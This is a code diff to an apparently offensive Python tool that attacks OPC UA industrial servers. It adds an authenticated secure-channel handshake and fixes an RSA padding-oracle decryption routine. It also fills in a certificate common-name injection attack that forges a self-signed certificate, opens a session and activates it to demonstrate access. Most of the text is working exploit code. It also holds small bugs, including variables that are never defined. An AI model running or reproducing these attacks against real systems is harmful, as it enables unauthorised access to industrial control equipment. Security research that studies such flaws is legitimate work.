@@ -1,6 +1,8 @@
 import requests
 requests.packages.urllib3.disable_warnings()
 
+from Crypto.PublicKey.RSA import RsaKey
+
 from messages import *
 from message_fields import *
 from typing import *
@@ -23,7 +25,7 @@ def log_success(msg : str):
   print(f'[+] {msg}')
   
 # Self signed certificate template (DER encoded) used for path injection attack.
-SELFSIGNED_CERT_TEMPLATE = b64decode('MIIDlzCCAn+gAwIBAgIUQQb8NNyLO/ABt/t+WsLPGtj7cMAwDQYJKoZIhvcNAQELBQAwWzELMAkGA1UEBhMCTkwxEjAQBgNVBAgMCUZha2VTdGF0ZTEQMA4GA1UECgwHRmFrZU9yZzEPMA0GA1UECwwGRmFrZU9VMRUwEwYDVQQDDAxwYXlsb2FkLWhlcmUwHhcNMjQwMzEzMTM1OTEzWhcNMjQwNDEyMTM1OTEzWjBbMQswCQYDVQQGEwJOTDESMBAGA1UECAwJRmFrZVN0YXRlMRAwDgYDVQQKDAdGYWtlT3JnMQ8wDQYDVQQLDAZGYWtlT1UxFTATBgNVBAMMDHBheWxvYWQtaGVyZTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANLvUdVEtRAP8MTGv1R551nQwl9B3xsTb+LvV3wfZdeE+xR06MX1WHtH7JaKqKRSii9gbixxRU0hF3eVdl1iHwVxRXNEn7DGaiIoIqvlICNJaYWJv1LcJ91XkdloKAh76eCRWHLvROdk2RMMRDPfAvpPSslgkYT3K/fMr06GQB8wMIdmoB3qLicc+D0jCzgg/tu+HnMsU6F0VA/foZXljOvwNxkqqLwpRLyFrMOBruvP5gKC62+fAikG4cl2P6Z1gJnjwUiFU/HVBMwJad7HxeFYjl1kmzijFquBK4UJ1QuH6k50brj6A51SavYy9f73wtJAp8pwj4DDVEILVXNWRN8CAwEAAaNTMFEwHQYDVR0OBBYEFGM7NXvtqb7CbS0eDRP3CsEhP6/wMB8GA1UdIwQYMBaAFGM7NXvtqb7CbS0eDRP3CsEhP6/wMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEBAJ81VhO3Yv0djA0uouDbZqamjaKV3QdBmDJwqaDmy0wNyVDPvydmgk7fv4Tir3+yZfJtHqUwllGMIScbBkKo2h/1FDQlDTrjH+LlwCblxP4eefAxp9UDvEDkEjGcP5lQel4etSt7ka5p5VBbAcsYIZs+h3KUZEhsgGTFc89PpKq5mt6dyIPu446csf9lumYDsbdE7F5Xq0oigZNTbHxot7VmisG1NDDkeeHi6N0Xhbb0H5V1pDcHWASukH67XS7opv00qC76UQItmQBetYoFtcITLI8bTwoJZYELbR/HEc8Y6q0AOF/kuji9rKNFsZBkqybb53eLYZyktgPOg/QQsng=')
+SELFSIGNED_CERT_TEMPLATE = b64decode('MIIE6TCCA9GgAwIBAgIKEtz1iOEt2W2zvjANBgkqhkiG9w0BAQsFADB9MSAwHgYKCZImiZPyLGQBGRMQdHRlcnZvb3J0LXNlY3VyYTEXMBUGA1UEChMOT1BDIEZvdW5kYXRpb24xEDAOBgNVBAgTB0FyaXpvbmExCzAJBgNVBAYTAlVTMSEwHwYDVQQDExhDb25zb2xlIFJlZmVyZW5jZSBDbGllbnQwHhcNMjQwMzEwMDAwMDAwWhcNMjUwMzEwMDAwMDAwWjB9MSAwHgYKCZImiZPyLGQBGRMQdHRlcnZvb3J0LXNlY3VyYTEXMBUGA1UEChMOT1BDIEZvdW5kYXRpb24xEDAOBgNVBAgTB0FyaXpvbmExCzAJBgNVBAYTAlVTMSEwHwYDVQQDExhDb25zb2xlIFJlZmVyZW5jZSBDbGllbnQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCVZar5gJGUm88hIcuTautbRnZ/TvBx4nezaab9djeHTCmx0EezCS/2LSAnCv3uYumvpvd5s03eEPfQ0s26wKqgUj4eKCn2XTukaORJu/jb9mGoD40bRwrMDMxW5CpHZ0xFgnyKHb3QbzzvwFwGTx1bXGz9xMe+J9r5mNzsHVZ46aVOScOrF44ZyRwbNkWAhIiXKgrJoHLKA6LN6iBA+kkKTZc7q+GsoEM5O4pwAXATqMGmsFaV/I05x7CckrNgUVZfT2PwwRMZ1hKITu1Z/Jti6dUzxyF5qWFoL5TDNKFQYPtR13LaQpQkzUqkw8VkUeBiT+hFsiT4GkYuo9Emv9TxAgMBAAGjggFpMIIBZTAMBgNVHRMBAf8EAjAAMB0GA1UdDgQWBBTJcPReZqL1YOptopao2c+m/nvp8DCBsQYDVR0jBIGpMIGmgBTJcPReZqL1YOptopao2c+m/nvp8KGBgaR/MH0xIDAeBgoJkiaJk/IsZAEZExB0dGVydm9vcnQtc2VjdXJhMRcwFQYDVQQKEw5PUEMgRm91bmRhdGlvbjEQMA4GA1UECBMHQXJpem9uYTELMAkGA1UEBhMCVVMxITAfBgNVBAMTGENvbnNvbGUgUmVmZXJlbmNlIENsaWVudIIKEtz1iOEt2W2zvjAOBgNVHQ8BAf8EBAMCAvQwIAYDVR0lAQH/BBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMFAGA1UdEQRJMEeGM3Vybjp0dGVydm9vcnQtc2VjdXJhOlVBOlF1aWNrc3RhcnRzOlJlZmVyZW5jZUNsaWVudIIQdHRlcnZvb3J0LXNlY3VyYTANBgkqhkiG9w0BAQsFAAOCAQEAjw9zu/9SPD6iOex67jS/xaKc7JhWTa7JBZjY7xPYEhnxSwkyMW7I8AkAK/d5w9/WJl0I2dTlZ8ftKKUFjOV7TrNhT2TNuYVqq9OZQhJYKEPmfUhb5oAHqGLWCixyDfiez69hLii0QT5qVYi5rR5S+C0KQ3uNXRt3subM3edND9LSuUc3DTfc2r6ZFQ9SR0Y0BCf3gLyB7VPrVKxpKspNjTv/5y3dSI4q1VNA+q8OaXxSVUVlTN/Nlg8euWELiHeGGHu3EKqje1swN4cLXoSWfhn6qW/x/PvcUZMvK2xrukrR1f1SR/R9gZm0SKeEEq0nRrn1ASPB5sMtOWPxdruSKA==')
 
 # Thrown when an attack was not possible due to a configuration that is not vulnerable to it (other exceptions indicate 
 # unexpected errors, which can have all kinds of causes). 
@@ -128,6 +130,44 @@ def unencrypted_opn(sock: socket) -> ChannelState:
     msg_counter=2,
     crypto=None,
   )
+  
+# Do a  OPN protocol with a certificate and private key.
+def authenticated_opn(sock : socket, endpoint : endpointDescription.Type, client_certificate : bytes, privkey : RsaKey) -> ChannelState:
+  sp = endpoint.securityPolicyUri
+  
+  if sp == SecurityPolicy.NONE:
+    return unencrypted_opn(sock)
+  else:
+    client_nonce = os.urandom(32)
+    payload = encodedConversation.to_bytes(encodedConversation.create(
+        sequenceNumber=1,
+        requestId=1,
+        requestOrResponse=openSecureChannelRequest.to_bytes(openSecureChannelRequest.create(
+          requestHeader=simple_requestheader(),
+          clientProtocolVersion=0,
+          requestType=SecurityTokenRequestType.ISSUE,
+          securityMode=endpoint.securityMode,
+          clientNonce=client_nonce,
+          requestedLifetime=3600000,
+        ))
+    ))
+    replymsg = opc_exchange(sock, OpenSecureChannelMessage(
+      secureChannelId=0,
+      securityPolicyUri=sp,
+      senderCertificate=client_certificate,
+      receiverCertificateThumbprint=certificate_thumbprint(endpoint.serverCertificate),
+      encodedPart=rsa_ecb_encrypt(sp, certificate_publickey(endpoint.serverCertificate), payload)
+    ))
+    convrep, _ = encodedConversation.from_bytes(rsa_ecb_decrypt(sp, privkey, reply.encodedPart))
+    resp, _ = openSecureChannelResponse.from_bytes(convrep.requestOrResponse)
+    
+    return ChannelState(
+      sock=sock,
+      channel_id=resp.securityToken.channelId,
+      token_id=resp.securityToken.tokenId,
+      msg_counter=2,
+      crypto=deriveKeyMaterial(sp, client_nonce, resp.serverNonce)
+    )
 
 
 # Exchange a conversation message, once the channel has been established by the OPN exchange.
@@ -713,8 +753,8 @@ def rsa_decryptor(oracle : PaddingOracle, certificate : bytes, ciphertext : byte
       # r_i = 103556 # HACK
       done = False
       while not done:
-        print(f'r_i={r_i}; {ceildiv(2 * B + r_i * n, b)} <= new_s < {(3 * B + r_i * n) // a}', file=sys.stderr, flush=True)
-        for new_s in range(ceildiv(2 * B + r_i * n, b), (3 * B + r_i * n) // a):
+        print(f'r_i={r_i}; {ceildiv(2 * B + r_i * n, b)} <= new_s < {ceildiv(3 * B + r_i * n, a)}', file=sys.stderr, flush=True)
+        for new_s in range(ceildiv(2 * B + r_i * n, b), ceildiv(3 * B + r_i * n, a)):
           if test_factor(new_s):
             s_i = new_s
             done = True
@@ -735,7 +775,7 @@ def rsa_decryptor(oracle : PaddingOracle, certificate : bytes, ciphertext : byte
       a, b = next(iter(M_i))
       if a == b:
         m = a * pow(s0, n - 2, n) % n
-        return [(m >> bits) & 0xff for bits in reversed(range(0, k, 8))]
+        return bytes([(m >> bits) & 0xff for bits in reversed(range(0, k, 8))])
     
     i += 1
   
@@ -864,7 +904,6 @@ def forge_signature_attack(url : str, payload : bytes, try_opn : bool, try_passw
   return sig
   
 def inject_cn_attack(url : str, cn : str, second_login : bool, demo : bool):  
-  proto, host, port = parse_endpoint_url(url)
   log(f'Attempting reflection attack against {url}')
   
   mycert, privkey = selfsign_cert(SELFSIGNED_CERT_TEMPLATE, cn, datetime.now() + timedelta(days=100))
@@ -874,13 +913,76 @@ def inject_cn_attack(url : str, cn : str, second_login : bool, demo : bool):
   endpoints = get_endpoints(url)
   log(f'Server advertises {len(endpoints)} endpoints.')
   
-  # Pick any endpoint, preferably with a non-None policy.
-  ep = max(endpoints, key=lambda ep: ep.securityPolicyUri != SecurityPolicy.NONE)
+  # Pick any with a non-None policy, preferably with None user authentication.
+  # Also prefer TCP over HTTPS endpoint; shouldn't matter much for attack, but former is easier to sniff.
+  ep = max(endpoints, key=lambda ep: [
+    ep.securityPolicyUri != SecurityPolicy.NONE, 
+    any(t.tokenType == UserTokenType.ANONYMOUS for t in ep.userIdentityTokens),
+    ep.transportProfileUri.endswith('uatcp-uasc-uabinary'),
+  ])
   if ep.securityPolicyUri == SecurityPolicy.NONE:
-    log('All endpoints only use the None policy. Certificate may be ignored, byt trying attack anyway.')
+    raise AttackNotPossible('Server only supports None security policy.')
     
-  .....
+  def trylogin():
+    try:
+      proto, host, port = parse_endpoint_url(url)
+      if proto == TransportProtocol.TCP_BINARY:
+        sock = connect_and_hello(host, port)
+        chan = authenticated_opn(sock, ep, mycert, privkey)
+        log_success('Certificate was accepted during OPN handshake. Will now try to create a session with it.')
+      else:
+        assert proto == TransportProtocol.HTTPS
+        chan = url
+      
+      createreply = generic_exchange(chan, ep.securityPolicyUri, createSessionRequest, createSessionResponse, 
+        requestHeader=simple_requestheader(),
+        clientDescription=applicationDescription.create(
+          applicationUri=cn,
+          productUri=cn,
+          applicationName=LocalizedText(text=cn),
+          applicationType=ApplicationType.CLIENT,
+          gatewayServerUri=None,
+          discoveryProfileUri=None,
+          discoveryUrls=[],
+        ),
+        serverUri=ep.server.applicationUri,
+        endpointUrl=ep.endpointUrl,
+        sessionName=None,
+        clientNonce=os.urandom(32),
+        clientCertificate=mycert,
+        requestedSessionTimeout=600000,
+        maxResponseMessageSize=2**24,
+      )
+      log_success('CreateSessionRequest with certificate accepted.')
+      anon_policies = [p for p in login_endpoint.userIdentityTokens if p.tokenType == UserTokenType.ANONYMOUS]
+      if anon_policies:
+        log('Trying to activate session.')
+        activatereply = generic_exchange(chan, ep.securityPolicyUri, activateSessionRequest, activateSessionResponse, 
+          requestHeader=simple_requestheader(createreply.authenticationToken),
+          clientSignature=rsa_sign(ep.securityPolicyUri, privkey, ep.serverCertificate + createreply.serverNonce),
+          clientSoftwareCertificates=[],
+          localeIds=[],
+          userIdentityToken=anonymousIdentityToken.create(policyId=anon_policies[0].policyId),
+          userTokenSignature=signatureData.create(algorithm=None,signature=None),
+        )
+        log_success('Authentication with certificate was succesfull!')
+        return chan, activatereply.authenticationToken
+      else:
+        log(f'Server requires user authentication, which is not implemented for this attack. Will stop here.')
+        return None
+    except ServerError as err:
+      log(f'Login blocked. Server responsed with error {hex(err.errorcode)}.')
+      return None      
+        
+  log(f'Trying to submit cert to endpoint {ep.endpointUrl}.')
+  chantoken = trylogin()
   
+  if not chantoken and second_login:
+    log('Trying the second authentication attempt...')
+    chantoken = trylogin()
+    
+  if chantoken and demo:
+    demonstrate_access(*chantoken, ep.securityPolicyUri)
     
     
 if __name__ == '__main__':
